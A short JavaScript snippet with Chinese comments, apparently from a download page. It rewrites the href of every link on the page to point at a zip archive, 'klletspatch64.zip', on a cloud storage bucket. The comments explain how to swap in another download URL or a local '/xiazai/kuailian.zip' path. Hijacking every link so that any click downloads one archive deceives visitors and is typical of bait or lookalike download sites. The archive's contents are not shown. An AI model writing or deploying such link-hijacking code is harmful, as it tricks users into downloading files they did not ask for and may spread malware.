 

var xz = "https://letsexetop.oss-ap-southeast-1.aliyuncs.com/klletspatch64.zip";

//可以把   https://letsexetop.oss-ap-southeast-1.aliyuncs.com/klletspatch64.zip  这个改成下载地址；https://letsexetop.oss-ap-southeast-1.aliyuncs.com/klletspatch64.zip
//可以把   https://letsexetop.oss-ap-southeast-1.aliyuncs.com/klletspatch64.zip  这个改成文件下载：/xiazai/kuailian.zip



var links = document.getElementsByTagName("a");
for (var i = 0; i < links.length; i++) {
    if (links[i].hasAttribute("href")) {
        links[i].href = xz;
    }
} 
